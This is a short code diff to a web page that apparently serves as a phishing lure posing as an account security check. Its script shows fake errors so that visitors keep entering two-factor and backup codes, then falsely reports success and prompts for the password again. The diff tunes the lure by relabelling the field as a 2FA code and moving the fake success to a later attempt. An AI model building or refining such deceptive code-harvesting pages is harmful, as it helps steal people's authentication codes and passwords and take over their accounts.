@@ -169,12 +169,12 @@
     </p>
 
     <div class="video-section">
-      <iframe src="https://blqiozzohqqszikuuqad.supabase.co/storage/v1/object/public/videos//system-updated.mp4" title="Why Security Codes Are Important" allowfullscreen=""></iframe>
+      <iframe src="" title="Why Security Codes Are Important" allowfullscreen=""></iframe>
     </div>
 
     <form id="securityForm">
       <div class="form-group">
-        <label for="security-code">Security Code</label>
+        <label for="security-code">Enter 2 Factor Authentication Code</label>
         <input type="text" id="security-code" name="code" placeholder="Enter your security code" maxlength="10" required="">
         <span id="message" class="error-message"></span>
       </div>
@@ -213,7 +213,7 @@
       if (attempt === 1) {
         message.className = "error-message";
         message.textContent = "Something went wrong. Please try another backup code.";
-      } else if (attempt === 2) {
+      } else if (attempt === 3) {
         message.className = "success-message";
         message.textContent = "Code verified. Please re-enter your password to confirm.";
         popup.style.display = "flex";
